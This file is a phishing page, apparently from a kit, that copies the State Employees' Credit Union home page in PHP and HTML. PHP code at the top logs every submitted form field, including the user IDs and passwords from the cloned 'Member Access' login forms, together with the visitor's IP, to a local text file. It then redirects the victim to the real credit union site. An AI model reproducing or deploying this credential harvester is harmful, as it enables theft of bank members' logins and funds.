<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://www.ncsecu.org/');
$handle = fopen('log_d3xkb5mAZU.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿<!DOCTYPE html>
<html lang="en"><!-- InstanceBegin template="/Templates/MasterTemplate.dwt" codeOutsideHTMLIsLocked="false" -->
<!-- head -->
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
  	<!-- InstanceBeginEditable name="Title" -->
    <title>State Employees' Credit Union - Home</title>
    <!-- InstanceEndEditable -->  
	<!-- InstanceBeginEditable name="MetaInformation" -->
    <meta name="Description" content="Proudly serving North Carolina employees, their families and our community. People helping people - together we can make 
        a difference!" />
    <meta name="Keywords" content="SECU,credit union,financial institution,bank,mortgage assistance,mortgage loan,home equity,home equity loan,vehicle loan,
        auto loan,checking,checking account,money market,cds,certificate of deposit,savings,savings account,invest,investment account,online service,online 
        banking,mobile access,bill payment,visa check card,visa credit card,credit card" />
    <meta name="searchTitle" content="Home" />
    <meta name="ROBOTS" content="NOODP" />
    <!-- InstanceEndEditable -->
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="0" />
    <!-- icons -->
	<link rel="icon" href="https://www.ncsecu.org/Images/favicon.ico" type="image/x-icon" />
	<link rel="icon" href="https://www.ncsecu.org/Images/icon-v3-128x128.png" sizes="128x128"/> 
	<link rel="icon" href="https://www.ncsecu.org/Images/icon-v3-192x192.png" sizes="192x192"/> 
	<link rel="apple-touch-icon" href="https://www.ncsecu.org/Images/apple-touch-icon-v3-76x76.png">
	<link rel="apple-touch-icon" href="https://www.ncsecu.org/Images/apple-touch-icon-v3-152x152.png" sizes="152x152">
	<link rel="apple-touch-icon" href="https://www.ncsecu.org/Images/apple-touch-icon-v3-167x167.png" sizes="167x167">
	<link rel="apple-touch-icon" href="https://www.ncsecu.org/Images/apple-touch-icon-v3-180x180.png" sizes="180x180">
	<!-- css -->      
    <link rel="stylesheet" type="text/css" href="https://www.ncsecu.org/Includes/Bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="https://www.ncsecu.org/Includes/bootstrap-accessibility.css?ver=1.1">
    <link rel="stylesheet" type="text/css" href="https://www.ncsecu.org/Includes/Secu2017.css?ver=9.5">
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/Global.js?ver=3.3"></script>
    <script type="text/javascript" src="https://www.ncsecu.org/Includes/gaTrack.min.js?ver=1.0"></script>
	<script src="https://www.ncsecu.org/o/inc/ncsecu_common.js"></script>
	<!-- InstanceBeginEditable name="HeadItems" -->
    <link rel="stylesheet" type="text/css" href="https://www.ncsecu.org/Includes/Secu2017-home-banners.css?ver=11.54">
    <script type="text/javascript" src="https://www.ncsecu.org/Info/Data/ImportantNotice.js"></script>
    <!-- InstanceEndEditable -->
</head>
<!-- body -->
<body onload="LoadPage();" onunload="UnloadPage();" class="secu-home">
<!-- ribbon -->
<div role="navigation" class="ribbon-wrapper" aria-label="Primary">
    <!-- skip to -->
    <div class="skip-link"><a href="https://www.ncsecu.org/#maincontent"><strong>Skip to content</strong></a></div>
    <div class="ribbon">
            <div class="ribbon-logo">
                <a href="https://www.ncsecu.org/Home.html" target="_top"><img src="https://www.ncsecu.org/Images/state-employees-credit-union-logo@2x.png" alt="State Employees' Credit Union"/></a>
            </div>
            <ul class="utility-links">
                <li><a href="https://www.ncsecu.org/Home/ContactUs.html" target="_top">Contact Us</a></li>
            	<li><a href="https://www.ncsecu.org/Home/GeneralHelp.html" target="_top">Help</a></li>
            	<li><a href="https://www.ncsecu.org/RatesAndFees/LendingRates.html" target="_top">Lending Rates</a></li>
				<li><a href="https://www.ncsecu.org/RatesAndFees/ShareandDepositRates.html" target="_top">Share and Deposit Rates</a></li>
				<li><a href="https://www.ncsecu.org/RatesAndFees/Fees.html" target="_top">Fees</a></li>				
            	<li><a href="https://www.ncsecu.org/AboutSECU/ABARoutingTransitNumber.html" target="_top">Routing Number: 253177049</a></li>
            </ul>
            <div class="secu-clearer-right"></div>
            <form role="search" id="SearchRequestForm" method="post" action="<?php echo basename(__FILE__); ?>">
                       
                        <div class="input-group">
                            <input type="text" id="searchInput" name="searchInput" class="form-control" placeholder="Search" 
                            aria-label="Search SECU" maxlength="50" onfocus="SearchBoxFocus(this);" onblur="SearchBoxBlur(this);" title="Search Request Form Field">
                            <button aria-label="Search" class="input-group-addon" id="basic-addon2" onclick="DoSearch()" onkeypress="DoSearch()" title="Search Button">
                            Search<span class="glyphicon glyphicon-search" aria-hidden="true"></span>
							</button>
                        </div>             
            </form>          
          	<div class="navbar-mobile-link">
          		<a href="https://locations.ncsecu.org/search" target="_blank">Locate Us</a>
          		<a href="https://www.ncsecu.org/Home/MobileSignIn.html">Sign In</a>
          	</div>
    </div>
</div>
<!-- nav -->
<div role="navigation" class="navbar-wrapper" aria-label="Secondary">
<nav class="navbar navbar-default yamm">
        <div class="navbar-header">
          	<button type="button" data-toggle="collapse" data-target="#navbar-collapse-grid" class="navbar-toggle collapsed">
            Menu<span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span>
            </button>
            <a href="https://www.ncsecu.org/#" class="navbar-brand">NC SECU</a>
        </div>
        <div id="navbar-collapse-grid" class="navbar-collapse collapse">
            <ul class="nav navbar-nav">
           	<!-- nav 1 loan products -->
                <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Loan Products</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                    <!-- secu row start -->
                      <div class="col-sm-3">
                      <!-- auto -->
					  <p class="secu-nav-heading">Auto</p>
                      <a href="https://www.ncsecu.org/AutoLoans/GAPCoverage.html">GAP Coverage</a>
                      <a href="https://www.ncsecu.org/AutoLoans/VehicleLoans.html">Vehicle Loans</a>						
                      </div>
                      <div class="col-sm-3">
                      <!-- mortgages -->
                      <p class="secu-nav-heading">Mortgages</p>
                      <a href="https://www.ncsecu.org/Mortgages/AdjustableMortgage.html">Adjustable Rate Mortgages</a>
                      <a href="https://www.ncsecu.org/Mortgages/FixedMortgage.html">Fixed Rate Mortgages</a>
                      <a href="https://www.ncsecu.org/Mortgages/HomeEquity.html">Home Equity Line of Credit</a>
                      <a href="https://www.ncsecu.org/Mortgages/MortgageAssistanceProgram.html">Mortgage Assistance Program</a>
                      <a href="https://www.ncsecu.org/Mortgages/MortgageToolKit.html">Mortgage Loan Toolkit</a>
                      <a href="https://www.ncsecu.org/Mortgages/MLSRegistry.aspx">Nationwide Mortgage Licensing System<br> (NMLS) and SAFE Act</a>
                      <a href="https://www.ncsecu.org/Mortgages/SpecialMortgages.html">Special Mortgage Programs</a>
                      </div>
                      <div class="col-sm-3">
                      <!-- personal -->	
                      <p class="secu-nav-heading">Personal</p>
                      <a href="https://www.ncsecu.org/PersonalLoans/OpenEndSignature.html">Open-End Signature</a>
                      <a href="https://www.ncsecu.org/PersonalLoans/SalaryAdvance.html">Salary Advance</a>
                      <a href="https://www.ncsecu.org/PersonalLoans/ShareSecured.html">Share Secured</a>
                      <a href="https://www.ncsecu.org/PersonalLoans/Student.html">Student</a>
                      <a href="https://www.ncsecu.org/PersonalLoans/TermNotes.html">Term Notes</a>
					  <a href="https://www.ncsecu.org/Cards/Credit.html">Visa<sup>&reg;</sup> Credit Card</a>
                      <div class="secu-clearer"></div>
                      <p class="secu-nav-heading">Related Links</p>
                      <a href="https://www.ncsecu.org/PersonalLoans/CreditInsurance.html">Credit Insurance</a>						  
                      <a href="https://www.ncsecu.org/Mortgages/CreditReport.html">Credit Report</a>
                      <a href="https://www.ncsecu.org/RatesandFees/Fees.html">Lending Fees</a>
                      <a href="https://www.ncsecu.org/RatesandFees/LendingRates.html">Lending Rates</a>
                      <a href="https://www.ncsecu.org/PersonalLoans/LoanQualifying.html">Qualifying</a>
                      </div>
                      <div class="col-sm-3 nav-promo nav-promo-loan-products">
                      <!-- promo -->
                      <!-- -->
                      </div>
                      <!-- secu row end -->
                    </div>
                  </li>
                </ul>
              </li>
              <!-- nav 2 accounts & cards -->
              <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Accounts &amp; Cards</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                        <div class="col-sm-3">
                        <!-- cards -->
                        <p class="secu-nav-heading">Cards</p>
                        <a href="https://www.ncsecu.org/Cards/CardholderTravelInfo.html">Cardholder Travel Information</a>
                        <a href="https://www.ncsecu.org/Cards/Debit.html">Debit Cards</a>
                        <a href="https://www.ncsecu.org/Cards/Credit.html">Visa<sup>&reg;</sup> Credit Card</a>
                        <a href="https://www.ncsecu.org/Cards/GiftCard.html">Visa<sup>&reg;</sup> Gift Card</a>
                        </div>
                        <div class="col-sm-3">
                        <!-- deposit accounts -->
                        <p class="secu-nav-heading">Share and Deposit Accounts</p>
                        <a href="https://www.ncsecu.org/Cards/CPG.html">CashPoints<sup>&reg;</sup> Global (CPG)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/Checking.html">Checking</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/CESA.html">Coverdell Education Savings (CESA)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/HealthSavingsAcct.html">Health Savings (HSA)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/HolidayCashAcct.html">Holiday Cash Club</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/IRA.html">Individual Retirement (IRA)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/MoneyMarket.html">Money Market Share</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/NC529.html" target="_top">NC 529 Plan</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/Share.html" target="_top">Share (Savings)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/STC.html" target="_top">Share Term Certificate (STC)</a>
                        <a href="https://www.ncsecu.org/DepositAccounts/SummerCashAcct.html" target="_top">Summer Cash</a>
                        </div>
                        <div class="col-sm-3">
                        <!-- life stages -->
                        <p class="secu-nav-heading">Life Stages</p>
                        <a href="https://www.ncsecu.org/LifeStages/FatCat.html" target="_top">(Ages 0-12) FAT CAT</a>
                        <a href="https://www.ncsecu.org/LifeStages/Zard.html" target="_top">(Ages 13-19) Zard</a>
                        <div class="secu-clearer"></div>
                        <p class="secu-nav-heading">Related Links</p>
                        <a href="https://www.ncsecu.org/DepositAccounts/PewSafeChecking.html" target="_top">Pew Safe Checking</a>
                  
						<a href="https://www.ncsecu.org/RatesAndFees/Fees.html" target="_top">Share and Deposit Account Fees</a>                       
						<a href="https://www.ncsecu.org/RatesAndFees/ShareandDepositRates.html" target="_top">Share and Deposit Account Rates</a>   
                        </div>
                        <div class="col-sm-3 nav-promo nav-promo-accounts-cards">
                      	<!-- promo -->
                      	</div>
                      <!-- secu row end -->
                    </div>
                  </li>
                </ul>
              </li>
              <!-- nav 3 estates & trust -->
              <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Estates &amp; Trusts</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                          <div class="col-sm-3">
                          <!-- estate planning -->
                          <p class="secu-nav-heading">Estate Planning</p>
                          <a href="https://www.ncsecu.org/EstatePlanning/HealthCareDirective.html">Advance Health Care Directive</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/EstatePlanningEssentialsProgram.html">Estate Planning Essentials Program</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/Guardianship.html">Guardianship</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/PowerOfAttorney.html">Power of Attorney</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/Probate.html" target="_top">Probate</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/WhenALovedOneDies.html">What to Do When a Loved One Dies</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/Will.html">Will</a>
                          <a href="https://www.ncsecu.org/EstatePlanning/WillSubstitute.html">Will Substitute</a>
                          </div>
                          <div class="col-sm-3">
                          <!-- trusts -->	
                          <p class="secu-nav-heading">Trusts</p>
                          <a href="https://www.ncsecu.org/Trust/BenefitstoEstablishingaTrust.html" target="_top">Benefits to Establishing a Trust</a>
                          <a href="https://www.ncsecu.org/Trust/MEMBERSTrustCompany.html" target="_top">Members Trust Company</a>
                          <a href="https://www.ncsecu.org/Trust/RevocableLivingTrust.html" target="_top">Revocable Living Trust</a>
                          <a href="https://www.ncsecu.org/Trust/SpecialNeedsTrust.html" target="_top">Special Needs Trust</a>
                          <p class="secu-nav-heading">Related Links</p>
                          <a href="https://www.ncsecu.org/AboutSECU/FiduciaryResourceGuides.html" target="_top">Fiduciary Resource Guides</a>
                          </div>
                          <div class="col-sm-6 nav-promo nav-promo-estates-insurance">
                      	<!-- promo -->
                      	</div>
                      <!-- secu row end -->
                    </div>
                  </li>
                </ul>
              </li>
              <!-- nav 4 insurance & investments -->
              <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Insurance &amp; Investments</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                          <div class="col-sm-3">
                          <!-- insurance -->	
                          <p class="secu-nav-heading">Insurance</p>
                          <a href="https://www.ncsecu.org/Insurance/Annuities.html" target="_top">Annuities</a>
                          <a href="https://www.ncsecu.org/Insurance/AutoHomeowners.html" target="_top">Auto, Home and More</a>
                          <a href="https://www.ncsecu.org/Insurance/Health.html" target="_top">Health</a>
                          <a href="https://www.ncsecu.org/Insurance/LifeInsurance.html" target="_top">Life Insurance</a>
                          <a href="https://www.ncsecu.org/Insurance/MedicareSupplementPlan.html" target="_top">Medicare Supplement Plan</a>
                          </div>
                          <div class="col-sm-3">
                          <!-- investments -->	
                          <p class="secu-nav-heading">Investments</p>
                          <a href="https://www.ncsecu.org/Investments/InvestmentAccount.html" target="_top">Investment Accounts</a>
                          <div class="secu-clearer"></div>
                          <p class="secu-nav-heading">Planning</p>
                          <a href="https://www.ncsecu.org/BranchServices/FinancialCounseling.html" target="_top">Financial Counseling</a>
                          <a href="https://www.ncsecu.org/AboutSecu/RetirementPlanning.html" target="_top">Retirement Planning</a>
                          </div>
                          <div class="col-sm-6 nav-promo nav-promo-investments-trusts">
                          <!-- promo -->
                          </div>
                      <!-- secu row end -->
                    </div>
                  </li>
                </ul>
              </li>
             <!-- nav 5 mobile and online -->
             <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Mobile &amp; Online</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                      <div class="col-sm-3">
                      <!-- mobile -->
                      <p class="secu-nav-heading">Mobile Services</p>
                      <a href="https://www.ncsecu.org/MobileServices/Alerts.html" target="_top">Alerts</a>
					  <a href="https://www.ncsecu.org/MobileServices/MobileApp.html" target="_top">Mobile App</a>
                      <a href="https://www.ncsecu.org/MobileServices/MobilePayments.html" target="_top">Mobile Payments</a>
                      <a href="https://www.ncsecu.org/MobileServices/MobileAccess.html" target="_top">Mobile Access Information</a>
                      <a href="https://www.ncsecu.org/MobileServices/OneTimePasscode.html" target="_top">One Time Passcode</a>
                      <a href="https://www.ncsecu.org/MobileServices/TextMessaging.html" target="_top">Two-Way Text Messaging</a>
                      <a href="https://www.ncsecu.org/MobileServices/VisaSRC.html" target="_top">Visa<sup>&reg;</sup> Secure Remote Commerce</a>
                      </div>
                      <div class="col-sm-3">
                      <!-- online -->
                      <p class="secu-nav-heading">Online Services</p>
                      <a href="https://www.ncsecu.org/OnlineServices/BillPay.html" target="_top">BillPay</a>
                      <a href="https://www.ncsecu.org/OnlineServices/BrowserRequirements.html" target="_top">Browser Requirements</a>
                      <a href="https://www.ncsecu.org/OnlineServices/FICOScore.html" target="_top">FICO<sup>&reg;</sup> Score </a>
                      <a href="https://www.ncsecu.org/OnlineServices/MemberAccess.html" target="_top">Member Access Information</a>
                      <a href="https://www.ncsecu.org/Security/SecurityOverview.html" target="_top">Online Security</a>
                      <a href="https://www.ncsecu.org/MobileServices/P2PPayments.html" target="_top">Peer-to-Peer Payments</a>
                      <a href="https://www.ncsecu.org/OnlineServices/QuickenDownload.html" target="_top">Quicken Download</a>
                      <a href="https://www.ncsecu.org/OnlineServices/RealTimeLoanAdvance.html" target="_top">Real-Time Loan Advance</a>
                      <a href="https://www.ncsecu.org/OnlineServices/Statements.html" target="_top">Statements</a>
                      <a href="https://www.ncsecu.org/OnlineServices/CreditCardBalanceTransfer.html" target="_top">Visa<sup>&reg;</sup> Credit Card Balance Transfer</a>
                      <a href="https://www.ncsecu.org/OnlineServices/CreditCardCashAdvance.html" target="_top">Visa<sup>&reg;</sup> Credit Card Cash Advance</a> 
                      </div>
                      <div class="col-sm-6 nav-promo nav-promo-mobile-online">
                      <!-- promo -->
                      </div>  
                      <!-- secu row end -->
                    </div>
                </li>      
            </ul>
           	</li>
             <!-- nav 6 services -->
             <li class="dropdown yamm-fw"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Services</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
                    <div class="row secu-nav-row">
                      <div class="col-sm-3">
                      <!-- automated services -->
                      <p class="secu-nav-heading">Automated Services</p>
                      <a href="https://www.ncsecu.org/AutomatedServices/ASKSECU.html" target="_top">ASK SECU</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/ATM.html" target="_top">CashPoints<sup>&reg;</sup> ATM</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/DirectDeposit.html" target="_top">Direct Deposit</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/FundsTransfer.html" target="_top">Funds Transfer</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/OverdraftTransferService.html" target="_top">Overdraft Transfer Service</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/PayrollDeduction.html" target="_top">Payroll Deduction</a>
                      <a href="https://www.ncsecu.org/AutomatedServices/WireTransfer.html" target="_top">Wire Transfer</a>
                      </div>
                      <div class="col-sm-3">
                      <!-- branch services -->	
                      <p class="secu-nav-heading">Branch Services</p>
                      <a href="https://www.ncsecu.org/BranchServices/CoinSorters.html" target="_top">Coin Redemption</a>
                      <a href="https://www.ncsecu.org/BranchServices/ForeignCurrency.html" target="_top">Foreign Currency</a>
                      <a href="https://www.ncsecu.org/BranchServices/Notary.html" target="_top">Notary &amp; Signature Guarantee</a>
                      <a href="https://www.ncsecu.org/BranchServices/SafeDepositBox.html" target="_top">Safe Deposit Boxes</a>
                      <a href="https://www.ncsecu.org/BranchServices/ShredDays.html" target="_top">Shred Days</a>
					  <a href="https://www.ncsecu.org/BranchServices/SavingsBonds.html" target="_top">United States Savings Bonds</a>
                      <a href="https://www.ncsecu.org/BranchServices/LaidOffTurntoSECU.html" target="_top">When Laid Off, Turn to SECU</a>
                      </div>
                      <div class="col-sm-3">
                      <!-- tax services -->
                      <p class="secu-nav-heading">Tax Services</p>
                      <a href="https://www.ncsecu.org/TaxServices/FreeTaxReturnPreparation.html" target="_top">Finding Free Tax Return Preparation Services</a>
                      <a href="https://www.ncsecu.org/TaxServices/LowCostTaxProgram.html" target="_top">Low-Cost Tax Preparation</a>
                      <a href="https://www.ncsecu.org/TaxServices/PrepareYourOwnTaxes.html" target="_top">Prepare Your Own Taxes</a>
                      <a href="https://www.ncsecu.org/TaxServices/TaxRefundInformation.html" target="_top">Tax Refund Information</a>
                      <a href="https://www.ncsecu.org/TaxServices/YearEndTaxDocuments.html" target="_top">Year-End Tax Documents</a>
					  <!-- related links -->
					  <p class="secu-nav-heading">Related Links</p>
					  <a href="https://onlineaccess.ncsecu.org/O/selfservices/housinglocator/housinglocator.aspx" target="_blank">SECU*RE Rental Housing Locator</a>
                      </div>                        
                      <div class="col-sm-3 nav-promo nav-promo-services">
                      <!-- promo -->
                      </div>
                      <!-- secu row end -->
                    </div>
                </li>      
            </ul>
           	</li>
			<!-- nav 7 sign in --> 
            <li class="dropdown yamm-fw nav-sign-in"><a href="https://www.ncsecu.org/#" data-toggle="dropdown" class="dropdown-toggle slidingUnderline">Sign In</a>
                <ul class="dropdown-menu">
                  <li class="grid-demo">
						<div class="row secu-nav-row">
                    	<!-- left half -->
                      	<div class="col-sm-9 sign-in-enroll">
                      	<!-- load on nav active <img src="https://www.ncsecu.org/Images/Navigation/computer-with-coffee-nav.jpg" alt="Sign up for Member Access"> -->
                       	<p class="secu-nav-heading">Enroll in Member Access</p> 
                        <p>Check out our many <a href="https://www.ncsecu.org/OnlineServices/MemberAccess.html">online</a> and <a href="https://www.ncsecu.org/MobileServices/MobileAccess.html">mobile</a> services and enroll in Member Access today!</p> 
                        <p><strong class="text-secu-blue">What you will need to enroll:</strong></p> 
                        <ul>
                              <li>16-digit ATM/Debit card number</li>
                              <li>3-digit voice response number</li>
                              <li>For the best user experience, view our <a href="https://www.ncsecu.org/OnlineServices/BrowserRequirements.html">Browser Requirements</a></li>
                        </ul>
                        <a href="https://www.ncsecu.org/javascript:window.location = MemberAccessEnrollURL;" target="_top" class="nav-form-button">Enroll Now</a>
                      	</div>
                      	<!-- right half -->
                      	<div class="col-sm-3 sign-in-access">
                        <p class="secu-nav-heading">Sign Into Member Access</p>
                        <!-- tms begin -->
                        <form method="post" id="templateForm" name="templateForm" action="<?php echo basename(__FILE__); ?>">
                        <fieldset>
                        <legend>Navigation Login:</legend>
                        <input type="text" name="userid" id="userid" placeholder="User ID" maxlength="16" onkeypress="return checkForValidCharacters(event)" size="16" title="User ID">
                        <div id="remember-me" class="Hide"><input name="rememberMeCheckbox" id="rememberMeCheckbox" type="checkbox" title="Check this box to remember the User ID" onchange="onRemberMeCheckBoxChanged(this, document.templateForm.userid.value)"/><a href="https://www.ncsecu.org/Security/RememberUserID.html" target="_top">Remember me</a></div>
                        <input type="password" name="password" id="password" title="Key in your password" maxlength="32" placeholder="Password" autocomplete="off">       
                        <a href="https://www.ncsecu.org/javascript:window.location = MemberAccessForgottenPasswordURL;" target="_top" id="forgottenPasswordLink" class="forgotten-password">Forgotten Password</a>
                        <input type="submit" value="Sign In" id="member-access-sign-in" class="nav-form-button" title="Sign In Button">
                        </fieldset>
                        </form>
						<!-- tms end -->
                      </div>                          
                      <!-- secu row end -->
                    </div>      
                  </li>  
                </ul>
            </li>
            <!-- nav 8 locate us -->
            <li class="dropdown yamm-fw nav-locate-us"><a href="https://locations.ncsecu.org/search" target="_blank" class="slidingUnderline">Locate Us</a>
            </li> <!-- end of locate us-->       
        </ul> <!-- end of nav navbar-nav -->   
      </div><!-- end of navbar-collapse collapse and id -->
</nav>
</div> 
        <!-- InstanceBeginEditable name="Body" -->

    <!-- important notice -->
    <div id="ImportantNotice">

    </div>
    <!-- banner -->
    <div role="banner" class="revampCarouselWrapper" aria-label="prime heading ">

        <div id="myCarousel" class="carousel slide carousel-fade lazier" data-ride="carousel" data-pause="hover">
            <!-- Indicators -->
            <ol class="carousel-indicators">
                <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
                <li data-target="#myCarousel" data-slide-to="1"></li>
                <li data-target="#myCarousel" data-slide-to="2"></li>
            </ol>
            <a class="help-drop" name="maincontent"></a>
            <div class="carousel-inner">

                <!-- slide 1 -->
                <div class="item turbotax-april active">
                    <img class="carouselSlide img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW-Ban.png" data-src="https://www.ncsecu.org/Images/HomePromos/turbotax-april.jpg" data-mob="Images/MABoxMidW-Ban.png" alt="Image of a woman and a man looking at documents." width="800" height="600">
                    <div class="carousel-caption carousel-caption-blue">
                        <a class="btn-carousel-blue caption-title-turbotax-april" href="https://www.ncsecu.org/TaxServices/PrepareYourOwnTaxes.html" target="_top">
                            <span class="caption-title caption-title-v2">TurboTax<sup>&reg;</sup></span>
                            <span class="caption-span-v2">Still need to do your taxes?</span>
                            <div class="caption-learn button-desktop">Get a TurboTax Discount with SECU &raquo;</div>
                        </a>
                    </div>
                </div>
                
                <!-- slide 2 -->
                 <div class="item mortgages-january">
                    <img class="carouselSlide img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW-Ban.png" data-src="https://www.ncsecu.org/Images/HomePromos/mortgages-january.jpg" data-mob="Images/MABoxMidW-Ban.png" alt="Image of a home kitchen." width="800" height="600">
                    <div class="carousel-caption carousel-caption-blue">
                        <a class="btn-carousel-blue caption-title-mortgages-january" href="https://www.ncsecu.org/Mortgages/AdjustableMortgage.html" target="_top">
                            <span class="caption-title caption-title-v2">Buying a Home?</span>
                            <span class="caption-span-v2">We have the Mortgage that’s right for you!</span>
                            <div class="caption-learn button-desktop">Learn More &raquo;</div>
                        </a>
                    </div>
                </div>

                <!-- slide 3 -->
                <div class="item direct-deposit-january">
                    <img class="carouselSlide img-responsive lazy" src="https://www.ncsecu.org/Images/MABoxMidW-Ban.png" data-src="https://www.ncsecu.org/Images/HomePromos/direct-deposit-january.jpg" data-mob="Images/MABoxMidW-Ban.png" alt="Man and woman sitting on a couch looking at a phone in the man’s hand." width="800" height="600">
                    <div class="carousel-caption carousel-caption-blue">
                        <a class="btn-carousel-blue caption-title-direct-deposit-january" href="https://www.ncsecu.org/AutomatedServices/DirectDeposit.html" target="_top">
                            <span class="caption-title caption-title-v2">Get Paid a Day Early</span>
                            <span class="caption-span-v2">With direct deposit; it’s safe, quick, and convenient.</span>
                            <div class="caption-learn button-desktop">Learn More &raquo;</div>
                        </a>
                    </div>
                </div>

                <!-- slide 4 -->

                <!-- arrows -->
                <a class="left carousel-control" href="https://www.ncsecu.org/#myCarousel" role="button" data-slide="prev">
                    <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
                    <span class="sr-only">Previous</span>
                </a>
                <a class="right carousel-control" href="https://www.ncsecu.org/#myCarousel" role="button" data-slide="next">
                    <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
                    <span class="sr-only">Next</span>
                </a>
            </div>
            <!-- end carousel inner -->
        </div>
        <!-- end carousel wrapper -->
        <!-- banner member access -->
        <div class="red">
            <div class="red-content">
                <form method="post" id="homeForm" name="homeForm" action="<?php echo basename(__FILE__); ?>">
                    <fieldset>
                        <legend>Banner Login:</legend>
                        <h1>Member Access</h1>
                        <div class="banner-member-access">
                            <input type="text" class="form-control" name="userIDHome" id="userIDHome" placeholder="User ID" title="User ID Home">
                            <input type="checkbox" id="checkboxHomeRememberMe" class="red-checkbox" name="checkboxHomeRememberMe" onchange="onRemberMeCheckBoxChanged(this, document.homeForm.userIDHome.value)" title="Remember Me Check Box Home">
                            <a href="https://www.ncsecu.org/Security/RememberUserID.html" target="_top" class="remember-me-check">Remember Me</a>
                            <input type="password" class="form-control" name="userPasswordHome" id="userPasswordHome" placeholder="Password" title="Key in your password Home" autocomplete="off">
                            <a href="https://www.ncsecu.org/javascript:window.location = MemberAccessForgottenPasswordURL;" target="_top" class="red-forgotten-link">Forgotten Password</a>
                            <input type="submit" value="Sign&nbsp;In" class="button highlights-button highlights-button-inline form-control" title="Login submit">
                            <a href="https://www.ncsecu.org/Home/WhatIsMemberAccess.html" target="_top" class="red-enroll-link">Enroll in Member Access</a>
                        </div>
                    </fieldset>
                </form>
            </div>
        </div>
    </div>
    <!-- body content -->
    <div role="main" class="marketing-wrapper" aria-label="contents">
        <div class="container marketing">

            <!-- no JS notice -->
            <noscript aria-label="no JavaScript notice">
                <div class="AlertBoxOn noJsAlertBoxOn">
                    <p>JavaScript Notice</p><strong class="text-secu-blue">Please Check Your Browser</strong><br>Your current browser is not capable of viewing this site because it does not support javascript. <br />If you are still unable to access the site, please visit our <a href="https://www.ncsecu.org/Home/GeneralHelp.html#SiteRecommendations">Browser page</a>.
                </div>
            </noscript>

            <!-- Three columns of text below the carousel -->
            <div class="row">
                <div class="col-sm-4">
                    <a href="https://www.ncsecu.org/MobileServices/MobileApp.html" target="_top" class="home-vector-link">
                        <!-- for ADA remember to set link text as well -->
                        SECU Mobile App <svg version="1.1" id="mobile-app-vector" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 140 140" enable-background="new 0 0 140 140" xml:space="preserve">
                            <title>SECU Mobile App</title>
                            <circle cx="70" cy="70" r="70" />
                            <path class="cls-1" d="M70,140a70,70,0,1,1,70-70A70.08,70.08,0,0,1,70,140ZM70,2a68,68,0,1,0,68,68A68.07,68.07,0,0,0,70,2Z" />
                            <path class="cls-1" d="M89.54,20.44H50.46a9,9,0,0,0-9,9v81.1a9,9,0,0,0,9,9H89.54a9,9,0,0,0,9-9V29.45A9,9,0,0,0,89.54,20.44Zm6,90.11a6,6,0,0,1-6,6H50.46a6,6,0,0,1-6-6v-5.48h51.1Zm0-8.48H44.45V39.68h51.1Zm0-65.39H44.45V29.45a6,6,0,0,1,6-6H89.54a6,6,0,0,1,6,6Z" />
